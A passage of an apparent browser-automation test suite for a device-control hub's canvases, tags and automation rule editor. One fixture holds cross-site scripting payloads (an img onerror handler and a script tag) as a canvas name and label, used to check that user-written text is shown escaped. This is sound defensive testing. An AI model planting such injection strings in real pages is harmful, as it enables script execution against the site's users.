        check("a note among an action's options is read, not filled in", "Full is 100." in await level_row.locator(".opts .note").inner_text() and await level_row.locator(".opts input").count() == 1, await level_row.locator(".opts").inner_text())
        if shots: await owner.screenshot(path=f"{shots}/8-controls-lamp.png", full_page=True)

        # --- Canvas: screens put together from JSON, by a person or by whoever can write a file ---
        import re
        everything = await (await owner_ctx.request.get(base + "/admin/api/all")).json()
        lamp_id = next(d["id"] for d in everything["drivers"] if d["name"] == "Stage lamp")
        given = await admin("/admin/api/screen/connections", {"id": "canvas", "drivers": ["sim-console", "sim-switch", lamp_id], "confirm": OWNER_PIN})
        check("Canvas can be given any kind of device", given.get("ok") is True, json.dumps(given))
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#shelf .item", has_text="Stage lamp").wait_for(timeout=10000)
        offered = await cv.locator("#shelf .item b").all_inner_texts()
        check("with no canvas yet, Canvas offers ones to start from, for the devices it was given", offered == ["Blank canvas", "My monitor mix", "Channel strips", "Power and lights", "Stage lamp"], str(offered))
        if shots: await owner.screenshot(path=f"{shots}/10-canvas-start.png")
        await cv.locator("#shelf .item", has_text="Stage lamp").get_by_role("button", name="Add").click()
        await cv.locator("#pages button").first.wait_for(timeout=8000)
        tabs = await cv.locator("#pages button").all_inner_texts()
        check("a device's ready-made buttons become a canvas, a page for each group", tabs == ["Levels", "Power"] and await cv.locator("#name").inner_text() == "Stage lamp", str(tabs))
        await cv.locator("#board button.piece", has_text="Full brightness").wait_for(timeout=8000)
        check("its buttons take their words from the device", await cv.locator("#board button.piece").all_inner_texts() == ["Full brightness", "Half brightness"], str(await cv.locator("#board button.piece").all_inner_texts()))
        await cv.locator("#pages button", has_text="Power").click()
        await cv.locator("#board button.piece", has_text="Lamp off").click()
        for _ in range(40):
            if (await state(lamp_id)).get("generic/reading/power") == "off": break
            await owner.wait_for_timeout(100)
        await cv.locator("#board button.piece", has_text="Lamp on").click()
        for _ in range(40):
            if (await state(lamp_id)).get("generic/reading/power") == "on": break
            await owner.wait_for_timeout(100)
        check("pressing one does what the device's author set it up to do", (await state(lamp_id)).get("generic/reading/power") == "on", json.dumps(await state(lamp_id))[:200])

        # Canvases written straight into the config folder, the way an agent would write them.
        await owner.goto(base + "/admin/hub"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")

        # Tags: values the hub holds itself, made on the Settings page.
        await owner.click("#newTag"); await owner.fill("#tagTitle", "Service live")
        check("a tag's ID follows its name", await owner.input_value("#tagName") == "service-live", await owner.input_value("#tagName"))
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_selector("#tags .item")
        listed = await owner.locator("#tags").inner_text()
        check("a tag made on the Settings page is listed with what it holds", "Flag, now Off" in listed and "tag/flag/service-live" in listed, listed)
        await owner.click("#newTag"); await owner.fill("#tagTitle", "Phase"); await owner.select_option("#tagKind", "choice")
        await owner.fill("#tagOptions", "closed, music, message")
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.wait_for_selector("#tags .item:nth-child(2)")
        listed = await owner.locator("#tags").inner_text()
        check("a choice starts at the first of its options", "Choice, now closed" in listed, listed)
        if shots: await owner.locator("#secTags").screenshot(path=os.path.join(shots, "tags.png"))

        # Automations: a rule is written, read back as a sentence, approved, turned on, and then acts by itself.
        await place("Automations"); await owner.wait_for_selector("#autoPause")
        tabs = await owner.evaluate("() => [...document.querySelectorAll('#places a')].map((a) => { const r = a.getBoundingClientRect(); return r.left >= 0 && r.right <= innerWidth + 0.5 && a.scrollWidth <= a.clientWidth + 1; })")
        check("all six places fit across a phone, none cut off", len(tabs) == 6 and all(tabs), str(tabs))
        # A rule is written on a page of its own, as a form. Every blank is filled from what the hub has.
        await owner.set_viewport_size({"width": 1280, "height": 900})
        await owner.click("#newAutomation"); await owner.wait_for_selector("#ruleName")
        check("a new automation is written on a page of its own, part of Automations", await places_shown() == ["automations/edit"] and owner.url.endswith("/admin/automations/new"), owner.url)
        # As JSON, a word the hub does not know is said as it is typed, before anything is saved.
        await owner.click("#ruleFlip")
        await owner.fill("#ruleText", '{"kind": "automation", "name": "Go live", "when": [{"key": "tag/choice/phase", "rise_past": 1}], "do": [{"key": "tag/flag/service-live", "value": true}]}')
        await owner.locator("#ruleProblems", has_text="rise_past").wait_for(timeout=8000)
        check("a rule with a word the hub does not know is refused where it was typed, with the word", "unknown field" in await owner.locator("#ruleProblems").inner_text())
        await owner.fill("#ruleText", '{"kind": "automation", "name": "", "when": [], "do": []}')
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleType")
        await owner.fill("#ruleName", "Go live")
        check("a rule's ID follows its name", await owner.input_value("#ruleId") == "go-live", await owner.input_value("#ruleId"))
        async def add_row(part, kind):
            await part.locator("button.rule-add").click()
            await part.locator(f".rule-menu button[data-kind='{kind}']").click()
        async def pick(row, find, text, nth=0):
            await row.locator("button.rule-value").nth(nth).click()
            await owner.fill("#pickFind", find)
            await owner.locator("#pickList button", has_text=text).first.click()
            await owner.wait_for_selector("#dlg:not([open])", state="attached")
        parts = owner.locator("#ruleForm .rule-part")
        when, do = parts.nth(0), parts.nth(2)
        await add_row(when, "value")
        trigger = when.locator(".rule-row").first
        check("a new row asks for its value before anything else", await trigger.locator("button.rule-value").inner_text() == "Choose value")
        await trigger.locator("button.rule-value").click(); await owner.wait_for_selector("#pickFind")
        await owner.locator("#pickList button").first.wait_for(timeout=8000)
        check("the list to choose from says how much there is and how to narrow it", "Search to narrow." in await owner.locator("#pickNote").inner_text() and await owner.locator("#dlgOk").is_hidden())
        if shots: await owner.screenshot(path=f"{shots}/9b-automation-pick.png")
        await owner.fill("#pickFind", "phase"); await owner.locator("#pickList button", has_text="Phase").first.click()
        await owner.wait_for_selector("#dlg:not([open])", state="attached")
        offered = await trigger.locator("select").nth(1).locator("option").all_text_contents()
        check("a value chosen from the list shapes its row: a choice offers its own options, and no marks to pass", await trigger.locator("button.rule-value").inner_text() == "Phase" and "music" in offered and await trigger.locator("select").nth(0).locator("option").all_text_contents() == ["becomes", "changes"], str(offered))
        await trigger.locator("select").nth(1).select_option("music")
        await add_row(do, "set")
        await pick(do.locator(".rule-row").nth(0), "service live", "Service live")
        check("a flag is set to On or Off, and starts as On", await do.locator(".rule-row").nth(0).locator("select").input_value() == "true")
        await add_row(do, "change")
        change = do.locator(".rule-row").nth(1)
        await change.locator("button.rule-value").click(); await owner.wait_for_selector("#pickFind")
        await owner.fill("#pickFind", LEVEL); await owner.locator("#pickList button", has_text=LEVEL).first.click()
        await owner.wait_for_selector("#dlg:not([open])", state="attached")
        check("a device's value is named by what it is and which one", await change.locator("button.rule-value").inner_text() == "Send level (input 1, bus 1)", await change.locator("button.rule-value").inner_text())
        await change.get_by_label("Amount").fill("2"); await change.get_by_label("Max").fill("0")
        await owner.locator("#ruleForm summary").click(); await owner.fill("#ruleGroup", "sound")
        await owner.locator("#ruleSentence", has_text="(at most 0)").wait_for(timeout=8000)
        said = await owner.locator("#ruleSentence").inner_text()
        check("what the rule would do is said in words as it is written", said.startswith('When Phase becomes "music": set Service live to on, then add 2 to Send level (input 1, bus 1) on Simulated board'), said)
        rows = await owner.evaluate("() => [...document.querySelectorAll('#ruleForm .rule-row')].map((r) => r.getBoundingClientRect().height)")
        check("on a computer's screen each row is one line", len(rows) == 3 and max(rows) < 70, str(rows))
        if shots:
            await owner.set_viewport_size({"width": 1280, "height": 1500}); await owner.evaluate("() => scrollTo(0, 0)")
            await owner.screenshot(path=f"{shots}/9b-automation-editor.png")
        await owner.set_viewport_size({"width": 390, "height": 844})
        if shots: await owner.screenshot(path=f"{shots}/9b-automation-editor-phone.png", full_page=True)
        await owner.click("#ruleSave")
        await owner.wait_for_selector("#autoProposed .item")
        told = await owner.locator("#autoProposed").inner_text()
        check("a saved rule waits for approval, said as a sentence with what it can set", 'When Phase becomes "music": set Service live to on, then add 2 to' in told and "Can set: Service live," in told and "(at most 0)" in told, told)
        check("until it is approved nothing is on", "0 enabled" in await owner.locator("#autoStatus").inner_text() and await owner.locator("#autoRules .item").count() == 0)
        if shots: await owner.screenshot(path=f"{shots}/9c-automation-proposed.png", full_page=True)
        await owner.locator("#autoProposed button", has_text="Approve").click(); await confirm()
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#autoRules .chip", has_text="Disabled").wait_for(timeout=8000)
        check("approved, it is the hub's and off", await owner.locator("#autoProposed .item").count() == 0)
        # Edited, it opens in the same form with every row as it was written.
        await owner.locator("#autoRules button", has_text="Edit").click(); await owner.wait_for_selector("#ruleType")
        shown = [await owner.input_value("#ruleName"), await owner.locator("#ruleTitle").inner_text(), await owner.locator("#ruleForm .rule-row").count(), await owner.locator("#ruleId").count(), await owner.locator("#ruleForm .rule-row button.rule-value").all_inner_texts()]
        check("an approved rule opens in the form as it was written, and its ID is not offered to change", shown == ["Go live", "Edit automation", 3, 0, ["Phase", "Service live", "Send level (input 1, bus 1)"]] and owner.url.endswith("/admin/automations/edit/go-live"), str(shown))
        await owner.click("#ruleCancel"); await owner.wait_for_selector("#autoRules .item")
        check("Cancel goes back to the list and changes nothing", await places_shown() == ["automations"] and await owner.locator("#autoProposed .item").count() == 0)
        # Every kind of row the form has, written by hand and read back as the document it makes.
        await owner.set_viewport_size({"width": 1280, "height": 900})
        await owner.click("#newAutomation"); await owner.wait_for_selector("#ruleName")
        await owner.fill("#ruleName", "Morning")
        parts = owner.locator("#ruleForm .rule-part")
        when, only, do = parts.nth(0), parts.nth(1), parts.nth(2)
        check("with no trigger, the form says how such a rule runs", "runs only from Run now" in await when.inner_text())
        await add_row(when, "at")
        await when.locator(".rule-row").nth(0).locator("button.chip", has_text="Sun").click()
        await add_row(when, "holds")
        held = when.locator(".rule-row").nth(1)
        await pick(held, "service live", "Service live")
        await held.get_by_label("For seconds").fill("5")
        await add_row(only, "value")
        cond = only.locator(".rule-row").nth(0)
        await pick(cond, LEVEL, LEVEL)
        await cond.get_by_label("Comparison").select_option(">"); await cond.get_by_label("Value").fill("-20")
        await add_row(only, "time")
        await only.get_by_label("How the conditions combine").select_option("any")
        await add_row(do, "wait"); await do.locator(".rule-row").nth(0).get_by_label("Seconds").fill("2")
        await add_row(do, "run")
        await do.locator(".rule-row").nth(1).locator("button.rule-value").click()
        await owner.fill("#pickFind", "go live"); await owner.locator("#pickList button", has_text="Run Go live").click()
        await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await add_row(do, "set")
        fade = do.locator(".rule-row").nth(2)
        await pick(fade, LEVEL, LEVEL)
        await fade.get_by_label("Value", exact=True).fill("-10"); await fade.get_by_label("Over seconds").fill("3")
        await fade.get_by_label("Move step up").click()
        await owner.locator("#ruleSentence", has_text="press Go live").wait_for(timeout=8000)
        said = await owner.locator("#ruleSentence").inner_text()
        check("its sentence names a schedule, a held condition, either-or conditions, a wait, a fade and another rule", said == "When the clock reaches 09:00 on Sunday, or when Service live is on for 5 seconds, if (Send level (input 1, bus 1) on Simulated board is above -20 or the time is from 08:00 to 12:00): wait 2 seconds, then fade Send level (input 1, bus 1) on Simulated board to -10 over 3 seconds, then press Go live.", said)
        check("a rule made of every kind of row has nothing wrong with it", await owner.locator("#ruleProblems .msg").count() == 0, await owner.locator("#ruleProblems").inner_text())
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleText")
        made = json.loads(await owner.input_value("#ruleText"))
        want = {"kind": "automation", "name": "Morning",
                "when": [{"at": "09:00", "days": ["sun"]}, {"holds": {"key": "tag/flag/service-live", "is": True}, "for": 5}],
                "do": [{"wait": 2}, {"key": LEVEL, "value": -10, "over": 3}, {"key": "automation/run/go-live"}],
                "if": {"any": [{"key": LEVEL, ">": -20}, {"time": {"from": "08:00", "to": "12:00"}}]}}
        check("the form writes the rule its rows say: a schedule, a condition held, any-of conditions, a wait, a fade and a run, in the order they were put", made == want, json.dumps(made))
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleType")
        # The rows not used above: a copy, a multiply, between, a value compared with another, and a stop condition.
        await add_row(do, "copy")
        await pick(do.locator(".rule-row").nth(3), LEVEL, LEVEL, 0)
        await pick(do.locator(".rule-row").nth(3), "console/input/2/bus/1/level", "console/input/2/bus/1/level", 1)
        await add_row(do, "change")
        await pick(do.locator(".rule-row").nth(4), LEVEL, LEVEL)
        await do.locator(".rule-row").nth(4).get_by_label("How it changes").select_option("multiply")
        await do.locator(".rule-row").nth(4).get_by_label("Amount").fill("0.5")
        await only.locator(".rule-row").nth(0).get_by_label("Comparison").select_option("between")
        await only.locator(".rule-row").nth(0).get_by_label("Low").fill("-30"); await only.locator(".rule-row").nth(0).get_by_label("High").fill("-5")
        await owner.locator("#ruleForm summary").click()
        stop = owner.locator("#ruleForm .rule-more")
        await add_row(stop, "value"); await pick(stop.locator(".rule-row").nth(0), "service live", "Service live")
        await stop.locator(".rule-row").nth(0).get_by_role("button", name="Compare to a value").click()
        await owner.fill("#pickFind", "pause all"); await owner.locator("#pickList button", has_text="Pause all automations").click()
        await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#ruleSentence", has_text="It stops if").wait_for(timeout=8000)
        clean = await owner.locator("#ruleProblems .msg").count() == 0
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleText")
        made = json.loads(await owner.input_value("#ruleText"))
        want["do"] += [{"key": LEVEL, "from": {"key": "console/input/2/bus/1/level"}}, {"key": LEVEL, "multiply": 0.5}]
        want["if"]["any"][0] = {"key": LEVEL, "between": [-30, -5]}
        want["cancel_when"] = {"key": "tag/flag/service-live", "is": {"key": "automation/paused"}}
        check("and the rest: a copy, a multiply, a range, a value compared with another value, and what stops a run", clean and made == want, json.dumps(made))
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleType")
        # The other two kinds of rule keep what the kinds share.
        await owner.click("#ruleType button[data-type='while']"); await owner.locator("#ruleType button[data-type='while'][aria-checked='true']").wait_for()
        titles = await owner.evaluate("() => [...document.querySelectorAll('#ruleForm .rule-part h3')].map((h) => h.firstChild.textContent)")
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleText")
        made = json.loads(await owner.input_value("#ruleText"))
        check("changed to run while a condition is true, it keeps its condition and its steps", titles == ["While", "When it becomes true", "When it stops being true"] and made.get("while") == want["if"] and made.get("do") == want["do"] and made.get("otherwise") == [] and made.get("cancel_when") == want["cancel_when"] and "when" not in made, json.dumps(made))
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleType")
        await owner.click("#ruleType button[data-type='follow']"); await owner.locator("#ruleType button[data-type='follow'][aria-checked='true']").wait_for()
        sync = owner.locator("#ruleForm .rule-part").nth(0)
        await pick(sync.locator(".rule-row").nth(0), LEVEL, LEVEL, 0)
        await pick(sync.locator(".rule-row").nth(0), "console/input/2/bus/1/level", "console/input/2/bus/1/level", 1)
        await owner.check("#ruleScale"); await sync.get_by_label("Target low").fill("-60"); await sync.get_by_label("Target high").fill("0")
        await sync.get_by_label("Max", exact=True).fill("-6")
        await owner.locator("#ruleSentence", has_text="follows").wait_for(timeout=8000)
        said = await owner.locator("#ruleSentence").inner_text()
        await owner.click("#ruleFlip"); await owner.wait_for_selector("#ruleText")
        made = json.loads(await owner.input_value("#ruleText"))
        check("changed to keep one value in sync with another, it is written as that", made == {"kind": "automation", "name": "Morning", "follow": {"key": "console/input/2/bus/1/level"}, "set": {"key": LEVEL}, "if": want["if"], "scale": {"in": [0, 100], "out": [-60, 0]}, "max": -6} and said.startswith("Send level (input 1, bus 1) on Simulated board follows Send level (input 2, bus 1) on Simulated board, scaled from 0 to 100 onto -60 to 0 (at most -6)"), json.dumps(made) + " " + said)
        await owner.click("#ruleCancel"); await owner.wait_for_selector("#autoRules .item")
        await owner.set_viewport_size({"width": 390, "height": 844})
        # A rule with more in it than the form shows opens as JSON, whole.
        nested = {"kind": "automation", "name": "Nested", "if": {"not": {"key": "tag/flag/service-live", "is": True}}, "do": [{"key": "tag/flag/service-live", "value": True}]}
        await owner.evaluate("(rule) => fetch('/admin/api/automation/save', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({id:'nested', rule})}).then(r => r.json())", nested)
        await owner.goto(base + "/admin/automations/edit/nested"); await owner.wait_for_selector("#ruleText")
        check("a rule the form cannot show opens as JSON, says why, and will not be turned into a form", json.loads(await owner.input_value("#ruleText")) == nested and "conditions inside conditions" in await owner.locator("#ruleMsg").inner_text() and await owner.locator("#ruleType").count() == 0)
        await owner.click("#ruleFlip")
        check("asked for the form, it says why not and stays as it is", "The form cannot show this rule" in await owner.locator("#ruleMsg").inner_text() and await owner.locator("#ruleText").count() == 1)
        await owner.goto(base + "/admin/automations/edit/no-such-rule"); await owner.locator("#ruleGone:not([hidden])").wait_for(timeout=8000)
        check("the address of a rule that is not there says so", await owner.locator("#ruleForm").is_hidden())
        await owner.goto(base + "/admin/automations"); await owner.wait_for_selector("#autoProposed .item")
        await owner.locator("#autoProposed button", has_text="Remove").click()
        await owner.locator("#autoProposed .item").wait_for(state="detached", timeout=8000)
        await owner.locator("#autoRules button", has_text="Enable").click()
        await owner.locator("#autoRules .chip", has_text="Enabled").first.wait_for(timeout=8000)
        check("turned on, the page says one is on", "1 enabled" in await owner.locator("#autoStatus").inner_text())
        before = (await state("sim-console")).get(LEVEL)
        r = await owner.evaluate("() => fetch('/admin/api/automation/live', {method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify({id:'go-live'})}).then(r => r.json())")
        check("its trigger is shown with what it reads now, and is not true yet", r.get("triggers") == [{"depth": 0, "words": 'Phase becomes "music"', "reads": '"closed"', "is": "false"}], json.dumps(r)[:300])
        await owner.locator("#autoRules button", has_text="Watch").click(); await owner.wait_for_selector("#ruleLive ol")
        if shots: await owner.screenshot(path=f"{shots}/9d-automation-watch.png")
        await owner.click("#dlgOk"); await owner.wait_for_selector("#dlg:not([open])", state="attached")
        await owner.locator("#autoRules button", has_text="Run now").click()
        for _ in range(50):
            if (await state("sim-console")).get(LEVEL) == before + 2: break
            await owner.wait_for_timeout(100)
        check("run from the page, it does its steps on the real device", (await state("sim-console")).get(LEVEL) == before + 2, str((await state("sim-console")).get(LEVEL)))
        await owner.wait_for_selector("#autoRules .chip:has-text('Last ran')")
        await owner.click("#autoPause"); await owner.locator("#autoStatus", has_text="Paused").wait_for(timeout=8000)
        await owner.locator("#autoRules button", has_text="Run now").click()
        await owner.locator("#autoMsg", has_text="Automations are paused").wait_for(timeout=8000)
        check("paused, a rule that is run says it did not and why", (await state("sim-console")).get(LEVEL) == before + 2)
        if shots: await owner.screenshot(path=f"{shots}/9e-automations-paused.png", full_page=True)
        await owner.click("#autoPause"); await owner.locator("#autoStatus", has_text="1 enabled").wait_for(timeout=8000)
        await owner.locator("#autoRules button", has_text="Disable").click()
        await owner.locator("#autoRules .chip", has_text="Disabled").wait_for(timeout=8000)
        await place("Settings"); await owner.wait_for_selector("#secConfig:not([hidden]) #configTrust")
        canvas_dir = os.path.join(re.search(r"in (.+)/devices\.", await owner.locator("#configWhere").inner_text()).group(1), "screens", "canvas")
        fixtures = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "fixtures", "canvas")
        for name in ["switcher", "run-sheet"]:
            with open(os.path.join(fixtures, name + ".json")) as src, open(os.path.join(canvas_dir, name + ".json"), "w") as dst: dst.write(src.read())
        with open(os.path.join(canvas_dir, "broken.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Half written", "pages": [{"name": "One", "pieces": [{"type": "slider", "at": [1, 1], "key": "level"}]}]}, f)
        with open(os.path.join(canvas_dir, "words.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "<img src=x onerror=parent.postMessage({type:'set'},'*')>", "pages": [{"name": "<b>One</b>", "pieces": [{"type": "label", "at": [1, 1, 4, 1], "text": "<script>document.title='run'</script><img src=x>"}, {"type": "label", "at": [1, 2, 4, 1], "text": "second"}]}]}, f)
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#switchList [data-id]").nth(4).wait_for(state="attached", timeout=8000)
        names = await cv.locator("#switchList [data-id]").all_text_contents()
        check("canvases written as files are there beside the one made on the page", names == ["<img src=x onerror=parent.postMessage({type:'set'},'*')>", "Half written", "Run sheet", "Stage lamp", "Switcher"], str(names))
        await choose(cv, "words"); await cv.locator("#board .label").first.wait_for()
        check("every word of a canvas is shown as words and never run", await cv.locator("#board img, #board script, #switchList img").count() == 0 and "<script>" in await cv.locator("#board .label").first.inner_text() and await next(f for f in owner.frames if "/screens/canvas/" in f.url).title() == "Skillfully: canvas")
        await choose(cv, "broken"); await cv.locator("#blank li").first.wait_for()
        told = await cv.locator("#blank").inner_text()
        check("a canvas that cannot be drawn says which file and what is wrong with it", "Canvas has errors" in told and "broken.json" in told and "Page 1, piece 1 (slider)" in told and "needs a key such as" in told, told)
        # From here, note every value the hub sends this screen.
        canvas_frame = next(f for f in owner.frames if "/screens/canvas/" in f.url)
        await canvas_frame.evaluate("() => { window.heard = []; addEventListener('message', (e) => { if (e.data && e.data.type === 'state') window.heard.push(...Object.keys(e.data.values)); }); }")
        await choose(cv, "switcher"); await cv.locator("#board button.piece", has_text="Outlet 3").wait_for(timeout=8000)
        await owner.wait_for_timeout(300)
        heard = await canvas_frame.evaluate("() => window.heard")
        check("a canvas tells the hub which values it is showing, and is sent those and no others", 8 <= len(set(heard)) <= 16 and all(k.startswith(("switch/outlet/", "generic/")) for k in heard), f"{len(set(heard))} values: {sorted(set(heard))[:6]}")

        # --- A slider tied to an action that takes a number: done once, when it is let go ---
        with open(os.path.join(canvas_dir, "lamp-level.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Lamp level", "pages": [{"name": "One", "pieces": [
                {"type": "readout", "at": [1, 1, 4, 1], "key": "generic/reading/level", "device": lamp_id, "title": "Level now"},
                {"type": "slider", "at": [1, 2, 4, 1], "key": "generic/action/level", "device": lamp_id, "sends": "level", "min": 0, "max": 100, "shows": {"key": "generic/reading/level"}, "title": "Level"}]}]}, f)
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#switchList [data-id]", has_text="Lamp level").wait_for(state="attached", timeout=8000)
        await choose(cv, "lamp-level")
        knob = cv.locator("#board .slider")
        await knob.wait_for()
        now = cv.locator("#board .readout .num")
        await owner.wait_for_timeout(800)
        was = (await now.inner_text()).strip()
        check("a slider tied to an action rests where the device says the thing is", was not in ("", "—") and await knob.get_attribute("aria-valuenow") == was, f"{await knob.get_attribute('aria-valuenow')} {await now.inner_text()}")
        box = await knob.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * 0.1, box["y"] + box["height"] / 2)
        await owner.mouse.down()
        for part in (0.25, 0.5, 0.7, 0.8):
            await owner.mouse.move(box["x"] + box["width"] * part, box["y"] + box["height"] / 2)
            await owner.wait_for_timeout(120)
        await owner.wait_for_timeout(500)
        check("while it is being moved, nothing is sent: the device is where it was", (await now.inner_text()).strip() == was and (await knob.get_attribute("aria-valuenow")) not in ("30", None), f"{await now.inner_text()} {await knob.get_attribute('aria-valuenow')}")
        await owner.mouse.up()
        for _ in range(60):
            if (await now.inner_text()).strip() == "80": break
            await owner.wait_for_timeout(100)
        check("let go, the action is done once with the number it was let go at", (await now.inner_text()).strip() == "80" and await knob.get_attribute("aria-valuenow") == "80", f"{await now.inner_text()} {await knob.get_attribute('aria-valuenow')}")
        if shots: await owner.screenshot(path=f"{shots}/12-canvas-action-slider.png")

        # --- Every other kind of piece, on a canvas of two pages ---
        import datetime
        # Four minutes on, to the minute: between three and four are left now, and still over one when it is read.
        soon = (datetime.datetime.now() + datetime.timedelta(minutes=4)).strftime("%H:%M")
        with open(os.path.join(canvas_dir, "every-piece.json"), "w") as f:
            json.dump({"kind": "canvas", "name": "Every piece", "pages": [
                {"name": "Main", "pieces": [
                    {"type": "light", "at": [1, 1, 2, 1], "key": "generic/reading/power", "device": lamp_id, "is": "on", "color": "red", "title": "Lamp is on"},
                    {"type": "meter", "at": [3, 1, 2, 1], "key": "generic/reading/level", "device": lamp_id, "min": 0, "max": 100, "title": "Level"},
                    {"type": "choice", "at": [1, 2, 4, 1], "key": "generic/action/level", "device": lamp_id, "sends": "level", "shows": {"key": "generic/reading/level"}, "title": "Preset",
                     "options": [{"value": 10, "title": "Low"}, {"value": 50, "title": "Half"}, {"value": 90, "title": "High"}]},
                    {"type": "stepper", "at": [1, 3, 2, 1], "key": "generic/action/level", "device": lamp_id, "sends": "level", "shows": {"key": "generic/reading/level"}, "min": 0, "max": 100, "step": 10, "title": "Level"},
                    {"type": "choice", "at": [3, 3, 2, 1], "key": "switch/outlet/4/on", "options": [{"value": True, "title": "On"}, {"value": False, "title": "Off"}], "title": "Outlet 4"},
                    {"type": "countdown", "at": [1, 4, 4, 2], "until": soon, "title": "Starts"},
                    {"type": "goto", "at": [1, 6, 2, 1], "page": "Lights", "color": "blue"}]},
                {"name": "Lights", "pieces": [{"type": "goto", "at": [1, 1, 2, 1], "page": "Main", "title": "Back"}]}]}, f)
        await owner.goto(base + "/s/canvas")
        cv = owner.frame_locator("#screen")
        await cv.locator("#switchList [data-id]", has_text="Every piece").wait_for(state="attached", timeout=8000)
        await choose(cv, "every-piece")
        await cv.locator("#board .updown").wait_for()
        await owner.wait_for_timeout(600)
        check("every new kind of piece is drawn, and none says it cannot be used", await cv.locator("#board .piece").count() == 7 and await cv.locator("#board .piece.off").count() == 0, f"{await cv.locator('#board .piece').count()} drawn, {await cv.locator('#board .piece.off').count()} off")
        lamp_power = (await state(lamp_id)).get("generic/reading/power")
        check("a light is lit while its value is what lights it", ("lit" in (await cv.locator("#board .light").get_attribute("class"))) == (lamp_power == "on"), f"{lamp_power} {await cv.locator('#board .light').get_attribute('class')}")
        preset = cv.locator("#board .choice", has_text="Preset")
        await preset.get_by_role("radio", name="High").click()
        meter_num = cv.locator("#board .meter .num")
        for _ in range(50):
            if (await meter_num.inner_text()).strip() == "90": break
            await owner.wait_for_timeout(100)
        check("a choice tied to an action does it with the option pressed, and a meter shows what the device then reports", (await meter_num.inner_text()).strip() == "90" and await preset.get_by_role("radio", name="High").get_attribute("aria-checked") == "true" and await preset.get_by_role("radio", name="Half").get_attribute("aria-checked") == "false", f"{await meter_num.inner_text()}")
        await cv.locator("#board .updown").get_by_role("button", name="Less Level").click()
        for _ in range(50):
            if (await meter_num.inner_text()).strip() == "80": break
            await owner.wait_for_timeout(100)
        check("a stepper takes it down by a step, from what the device holds", (await meter_num.inner_text()).strip() == "80" and (await cv.locator("#board .updown .num").inner_text()).strip() == "80", await meter_num.inner_text())
        outlet = cv.locator("#board .choice", has_text="Outlet 4")
        was_on = (await state("sim-switch"))["switch/outlet/4/on"]
        await outlet.get_by_role("radio", name="Off" if was_on else "On").click()
        for _ in range(50):
            if (await state("sim-switch"))["switch/outlet/4/on"] != was_on: break
            await owner.wait_for_timeout(100)
        check("a choice tied to a value sets it, and the one the device now holds is lit", (await state("sim-switch"))["switch/outlet/4/on"] == (not was_on) and await outlet.get_by_role("radio", name="Off" if was_on else "On").get_attribute("aria-checked") == "true")
        left = (await cv.locator("#board .countdown .num").inner_text()).strip()
        check("a countdown counts down to its time, marked as close in the last five minutes", left[0] in "1234" and ":" in left and "soon" in await cv.locator("#board .countdown").get_attribute("class"), left)
        if shots: await owner.screenshot(path=f"{shots}/14-canvas-every-piece.png")
        await cv.locator("#board button.goto", has_text="Lights").click()
        await cv.locator("#board button.goto", has_text="Back").wait_for(timeout=5000)
        await cv.locator("#board button.goto", has_text="Back").click()
        await cv.locator("#board .updown").wait_for(timeout=5000)
        check("a page button goes to its page, and one there comes back", True)
        await choose(cv, "lamp-level")
        knob = cv.locator("#board .slider"); now = cv.locator("#board .readout .num")
        await knob.wait_for()

        # --- On a wide screen a canvas uses the room there is ---
        narrow = (await cv.locator("#board").bounding_box())["width"]
        await owner.set_viewport_size({"width": 1440, "height": 900})
        await owner.wait_for_timeout(400)
        wide = (await cv.locator("#board").bounding_box())["width"]
        check("on a computer's screen a canvas fills the width, not a strip down the middle", wide > 1380 and narrow < 420, f"{narrow} then {wide}")
        if shots: await owner.screenshot(path=f"{shots}/13-canvas-wide.png")
        box = await knob.locator(".track").bounding_box()
        await owner.mouse.move(box["x"] + box["width"] * 0.8, box["y"] + box["height"] / 2)
        await owner.mouse.down()
        await owner.mouse.move(box["x"] + box["width"] * 0.5, box["y"] + box["height"] / 2)
        await owner.wait_for_timeout(150)
        await owner.mouse.up()
        for _ in range(60):
            if (await now.inner_text()).strip() == "50": break
            await owner.wait_for_timeout(100)
        check("and drawn larger, a slider still lands where the pointer let it go", (await now.inner_text()).strip() == "50", await now.inner_text())
        # Let go of, a slider does not keep the keyboard: a key pressed afterwards for something else moves nothing.
        held = await knob.evaluate("(e) => document.activeElement === e")
        await owner.keyboard.press("End"); await owner.keyboard.press("ArrowUp"); await owner.wait_for_timeout(400)
        check("a slider moved by hand lets go of the keyboard when the hand lets go", not held and (await now.inner_text()).strip() == "50", f"{held} {await now.inner_text()}")
        await knob.focus(); await owner.keyboard.press("ArrowUp")
        for _ in range(40):
            if (await now.inner_text()).strip() != "50": break
            await owner.wait_for_timeout(100)
        check("someone who goes to a slider with the keyboard still moves it with the keys", (await now.inner_text()).strip() != "50" and await knob.evaluate("(e) => document.activeElement === e"), await now.inner_text())
        await owner.keyboard.press("ArrowDown")
        for _ in range(40):
            if (await now.inner_text()).strip() == "50": break
            await owner.wait_for_timeout(100)
        await knob.evaluate("(e) => e.blur()")
        await choose(cv, "every-piece"); await cv.locator("#board .updown").wait_for()
        await owner.wait_for_timeout(300)
